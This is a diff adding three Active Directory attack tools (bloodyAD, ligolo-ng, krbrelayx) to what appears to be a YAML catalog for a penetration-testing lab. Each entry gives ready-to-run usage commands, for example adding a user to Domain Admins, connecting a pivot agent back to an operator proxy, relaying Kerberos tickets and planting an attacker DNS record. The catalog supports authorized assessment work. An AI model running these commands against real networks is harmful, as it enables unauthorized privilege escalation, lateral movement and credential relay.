@@ -185,6 +185,51 @@ tools:
       sees traffic on a network you're authorized to monitor. Depends on pcapy-ng
       (`pip3 install pcapy-ng`, plus libpcap-dev). Feeds nicely off Responder captures.
 
+  - title: "bloodyAD (AD Privilege Escalation)"
+    kind: install
+    tags: [active-directory, privesc, enumeration, kerberos]
+    description: "Active Directory privilege escalation and ACL/DACL abuse toolkit over LDAP/LDAPS, supporting Kerberos, NTLM, and pass-the-hash."
+    system_pkgs: {which: bloodyAD}
+    install: {pip: bloodyAD}
+    run: ["bloodyAD --help"]
+    project_url: "https://github.com/CravateRouge/bloodyAD"
+    usage:
+      - ["inspect writable objects for current user", "bloodyAD -d corp.local -u user -p pass --host dc01.corp.local get writable"]
+      - ["add user to a privileged group when ACL permits", "bloodyAD -d corp.local -u user -p pass --host dc01.corp.local add groupMember 'Domain Admins' user"]
+    lab_safe_notes: >-
+      `get` subcommands perform read-only LDAP queries; `set`/`add`/`remove` modify live
+      AD objects — use strictly in authorized lab or assessment scopes.
+
+  - title: "ligolo-ng (TUN-based Network Pivoting)"
+    kind: install
+    tags: [active-directory, tunneling, lateral-movement, network]
+    description: "Fast, lightweight multi-hop pivoting tool using a real TUN interface instead of SOCKS proxies — lets nmap and impacket work natively."
+    system_pkgs: {which: ligolo-proxy, brew: ligolo-ng}
+    install: {go: "github.com/nicocha30/ligolo-ng/cmd/proxy@latest"}
+    run: ["proxy --help"]
+    project_url: "https://github.com/nicocha30/ligolo-ng"
+    usage:
+      - ["start the operator proxy listener", "ligolo-proxy -selfcert"]
+      - ["connect an agent back from a pivot host", "./agent -connect <proxy-ip>:11601 -ignore-cert"]
+    lab_safe_notes: >-
+      Creates a TUN interface on the operator host (`ip tuntap add`) and tunnels traffic
+      to internal subnets — use only within authorized assessment scopes.
+
+  - title: "krbrelayx (Kerberos Relaying Toolkit)"
+    kind: install
+    tags: [active-directory, kerberos, relay, credentials]
+    description: "Toolkit for Kerberos unconstrained delegation abuse, DNS record manipulation (`dnstool.py`), and Kerberos credential relaying."
+    system_pkgs: {which: krbrelayx.py}
+    install: {git: "https://github.com/dirkjanm/krbrelayx.git"}
+    run: ["python3 krbrelayx.py --help"]
+    project_url: "https://github.com/dirkjanm/krbrelayx"
+    usage:
+      - ["listen and relay incoming Kerberos auth", "python3 krbrelayx.py -aesKey <krbtgt_or_machine_aes>"]
+      - ["add an AD-integrated DNS record via LDAP", "python3 dnstool.py -u 'corp.local\\user' -p pass -a add -r attacker.corp.local -d 10.10.14.5 dc01.corp.local"]
+    lab_safe_notes: >-
+      Actively modifies AD DNS or relays Kerberos tickets — run only inside authorized
+      AD labs or scoped penetration tests.
+
 # --- high-value AD attack reference -----------------------------------------
   - title: "The Hacker Recipes (AD)"
     kind: resource
